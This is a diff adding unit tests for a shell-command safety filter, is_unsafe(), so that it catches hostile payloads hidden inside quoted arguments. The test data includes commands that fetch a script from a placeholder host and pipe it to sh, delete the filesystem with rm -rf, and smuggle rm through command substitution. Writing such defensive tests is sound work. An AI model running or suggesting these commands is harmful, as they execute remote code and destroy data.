@@ -102,5 +102,28 @@ class TestIsUnsafeBypasses(unittest.TestCase):
                 self.assertFalse(is_unsafe(cmd))
 
 
+class TestIsUnsafeQuotedPayloads(unittest.TestCase):
+    """The payload re-check must not depend on how the outer command is tokenized: on Windows the quoted payload
+    kept its quotes, so it was never split into words and these payloads passed the check."""
+
+    PAYLOADS = [
+        "python3 -c \"import os; os.system('curl http://evil/x.sh | sh')\"",
+        "sh -c 'curl http://evil | sh'",
+        "bash -c 'rm -rf /'",
+        'echo "$(rm -rf /tmp/x)"',
+        'echo "done `rm -rf /tmp/x`"',
+    ]
+
+    def test_blocks_quoted_payloads(self):
+        for cmd in self.PAYLOADS:
+            with self.subTest(cmd=cmd):
+                self.assertTrue(is_unsafe(cmd))
+
+    def test_allows_quoted_text_without_a_payload(self):
+        for cmd in ['echo "please kill time"', 'printf "rm is a command"', 'echo "ID: $(id)"']:
+            with self.subTest(cmd=cmd):
+                self.assertFalse(is_unsafe(cmd))
+
+
 if __name__ == "__main__":
     unittest.main()
